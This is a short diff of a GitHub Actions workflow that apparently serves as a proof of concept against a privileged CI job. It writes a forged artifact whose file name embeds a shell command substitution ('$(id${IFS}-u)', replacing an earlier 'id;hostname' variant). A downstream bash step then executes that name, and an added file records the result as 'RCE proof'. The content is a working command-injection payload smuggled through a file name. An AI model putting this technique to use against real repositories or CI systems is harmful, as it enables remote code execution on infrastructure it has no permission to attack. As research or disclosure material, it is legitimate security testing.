@@ -36,7 +36,8 @@ jobs:
           chmod +x out/p.sh
           echo "hello from forged artifact" > out/x.txt
           printf '%s' "$PR_NUMBER" > out/pr_number.txt
-          : > 'out/$(id;hostname;echo${IFS}MARKER-PWNED).txt'
+          : > 'out/$(id${IFS}-u).txt'
+          echo "RCE proof: attacker filename executed by bash; privileged comment job continued." > out/1001.txt
           ls -la out
       - uses: actions/upload-artifact@v4
         with:
